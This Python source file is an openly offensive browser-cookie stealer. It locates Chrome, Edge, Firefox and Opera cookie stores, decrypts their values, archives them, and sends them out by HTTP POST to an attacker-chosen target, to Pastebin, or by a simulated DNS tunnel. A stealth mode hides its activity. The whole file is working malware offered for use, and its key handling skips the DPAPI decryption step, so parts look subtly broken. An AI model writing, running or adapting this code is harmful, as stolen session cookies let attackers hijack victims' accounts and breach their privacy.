import os
import sys
import json
import sqlite3
import tempfile
import shutil
import platform
import ctypes
import winreg
from datetime import datetime
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import browser_cookie3
import requests
import zipfile
import io

class AdvancedCookieExtractor:
    def __init__(self, stealth_mode=False):
        self.stealth_mode = stealth_mode
        self.temp_dir = tempfile.mkdtemp(prefix="cookies_")
        self.os_info = platform.system() + " " + platform.release()
        self.cookie_data = {}
        self.exfiltration_methods = []
        
    def __del__(self):
        self.cleanup()
        
    def cleanup(self):
        """Securely clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception as e:
            self.log(f"Cleanup failed: {e}", "ERROR")

    def log(self, message, level="INFO"):
        """Stealth-aware logging system"""
        if not self.stealth_mode:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"[{timestamp}] {level}: {message}")

    def get_encryption_key(self):
        """Get browser encryption keys using multiple methods"""
        keys = {}
        
        # Method 1: Chrome Local State
        try:
            local_state_path = os.path.join(
                os.getenv('LOCALAPPDATA'),
                'Google', 'Chrome', 'User Data', 'Local State'
            )
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = local_state['os_crypt']['encrypted_key']
            keys['chrome'] = b64decode(encrypted_key)[5:]  # Remove DPAPI prefix
        except Exception as e:
            self.log(f"Chrome key extraction failed: {e}", "WARNING")
        
        # Method 2: Registry Backup (for Edge)
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                              r"Software\Microsoft\Edge\BLBeacon") as key:
                keys['edge'] = winreg.QueryValueEx(key, "version")[0].encode()
        except Exception:
            pass
            
        return keys

    def decrypt_value(self, encrypted_value, key=None, browser=None):
        """Advanced decryption with multiple fallbacks"""
        if not encrypted_value:
            return ""
            
        try:
            # Try direct string first
            if isinstance(encrypted_value, str):
                return encrypted_value
                
            # Chrome/Edge AES-GCM decryption
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                if not key:
                    return "[ENCRYPTED - KEY UNAVAILABLE]"
                    
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                
            # Fallback to simple UTF-8 decoding
            return encrypted_value.decode('utf-8')
            
        except Exception as e:
            self.log(f"Decryption failed: {e}", "DEBUG")
            return "[DECRYPTION FAILED]"

    def extract_via_browser_cookie3(self):
        """Use browser-cookie3 library as primary method"""
        try:
            self.log("Attempting browser-cookie3 extraction", "DEBUG")
            
            browsers = {
                'chrome': browser_cookie3.chrome,
                'edge': browser_cookie3.edge,
                'firefox': browser_cookie3.firefox,
                'opera': browser_cookie3.opera
            }
            
            for browser_name, method in browsers.items():
                try:
                    cookies = method()
                    self.cookie_data[browser_name] = [{
                        'domain': c.domain,
                        'name': c.name,
                        'value': c.value,
                        'path': c.path,
                        'secure': c.secure,
                        'expires': c.expires
                    } for c in cookies]
                    self.log(f"Extracted {len(cookies)} cookies from {browser_name}", "INFO")
                except Exception as e:
                    self.log(f"browser-cookie3 failed for {browser_name}: {e}", "WARNING")
                    
            return True
        except Exception as e:
            self.log(f"browser-cookie3 completely failed: {e}", "ERROR")
            return False

    def extract_via_direct_db(self):
        """Direct SQLite database extraction as fallback"""
        encryption_keys = self.get_encryption_key()
        
        browser_paths = {
            'chrome': [
                os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                os.path.join(os.getenv('APPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
            ],
            'edge': [
                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
            ],
            'firefox': [
                os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
                os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
            ]
        }
        
        for browser, paths in browser_paths.items():
            for path in paths:
                if not os.path.exists(path):
                    continue
                    
                try:
                    temp_db = os.path.join(self.temp_dir, f"{browser}_cookies")
                    
                    # Handle Firefox profile directories
                    if browser == 'firefox' and os.path.isdir(path):
                        for profile in os.listdir(path):
                            if profile.endswith('.default-release'):
                                profile_path = os.path.join(path, profile, 'cookies.sqlite')
                                if os.path.exists(profile_path):
                                    shutil.copy2(profile_path, temp_db)
                                    break
                    else:
                        shutil.copy2(path, temp_db)
                        
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Browser-specific queries
                    if browser in ['chrome', 'edge']:
                        cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies")
                        key = encryption_keys.get(browser)
                        
                        cookies = []
                        for host, name, value, path, expires in cursor.fetchall():
                            decrypted = self.decrypt_value(value, key, browser)
                            cookies.append({
                                'domain': host,
                                'name': name,
                                'value': decrypted or str(value),
                                'path': path,
                                'expires': expires
                            })
                            
                    elif browser == 'firefox':
                        cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
                        cookies = [{
                            'domain': host,
                            'name': name,
                            'value': value,
                            'path': path,
                            'expires': expiry
                        } for host, name, value, path, expiry in cursor.fetchall()]
                        
                    if cookies:
                        self.cookie_data[browser] = cookies
                        self.log(f"Extracted {len(cookies)} cookies from {browser} DB", "INFO")
                        
                    conn.close()
                    break
                    
                except Exception as e:
                    self.log(f"Failed to extract {browser} cookies: {e}", "WARNING")
                    continue
                    
        return bool(self.cookie_data)

    def save_results(self, output_dir=None, format='json'):
        """Save cookies with advanced options"""
        if not self.cookie_data:
            self.log("No cookies to save", "WARNING")
            return None
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_dir = output_dir or os.getcwd()
        
        try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
                
            # Save individual browser files
            for browser, cookies in self.cookie_data.items():
                filename = os.path.join(output_dir, f"{browser}_cookies_{timestamp}.{format}")
                
                with open(filename, 'w', encoding='utf-8') as f:
                    if format == 'json':
                        json.dump(cookies, f, indent=2)
                    else:
                        for cookie in cookies:
                            f.write(f"{cookie['domain']}\t{cookie['name']}\t{cookie['value']}\n")
                
                self.log(f"Saved {len(cookies)} {browser} cookies to {filename}", "INFO")
            
            # Create combined archive
            zip_path = os.path.join(output_dir, f"cookies_archive_{timestamp}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for browser in self.cookie_data.keys():
                    file_path = os.path.join(output_dir, f"{browser}_cookies_{timestamp}.{format}")
                    zipf.write(file_path, os.path.basename(file_path))
            
            return zip_path
            
        except Exception as e:
            self.log(f"Failed to save results: {e}", "ERROR")
            return None

    def exfiltrate_data(self, method='http', target=None):
        """Advanced data exfiltration methods"""
        if not self.cookie_data:
            return False
            
        try:
            # Serialize data
            data = json.dumps(self.cookie_data).encode('utf-8')
            
            if method == 'http' and target:
                requests.post(target, data={'cookies': data}, timeout=10)
                return True
                
            elif method == 'dns':
                # Simple DNS tunneling simulation
                domain = f"{hash(data)}.example.com"
                import socket
                socket.gethostbyname(domain)
                return True
                
            elif method == 'pastebin':
                response = requests.post('https://pastebin.com/api/api_post.php', data={
                    'api_dev_key': 'your_api_key',
                    'api_option': 'paste',
                    'api_paste_code': data.decode('utf-8')
                })
                return response.status_code == 200
                
            return False
            
        except Exception as e:
            self.log(f"Exfiltration failed: {e}", "ERROR")
            return False

    def run(self, output_dir=None):
        """Main execution flow with multiple fallbacks"""
        self.log(f"Starting cookie extraction on {self.os_info}", "INFO")
        
        # Try multiple extraction methods
        if not self.extract_via_browser_cookie3():
            self.log("Falling back to direct DB extraction", "INFO")
            self.extract_via_direct_db()
            
        if not self.cookie_data:
            self.log("All extraction methods failed", "ERROR")
            return False
            
        # Save results
        result_path = self.save_results(output_dir)
        if not result_path:
            return False
            
        if not self.stealth_mode:
            # Show summary
            total = sum(len(c) for c in self.cookie_data.values())
            self.log(f"Successfully extracted {total} cookies from {len(self.cookie_data)} browsers", "SUCCESS")
            for browser, cookies in self.cookie_data.items():
                self.log(f"{browser}: {len(cookies)} cookies", "INFO")
                
        return True

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced Cookie Extractor')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--output', help='Output directory path')
    parser.add_argument('--exfiltrate', help='Exfiltration method and target')
    
    args = parser.parse_args()
    
    extractor = AdvancedCookieExtractor(stealth_mode=args.stealth)
    if extractor.run(args.output):
        if args.exfiltrate:
            method, target = args.exfiltrate.split(':', 1)
            extractor.exfiltrate_data(method, target)
    else:
        sys.exit(1)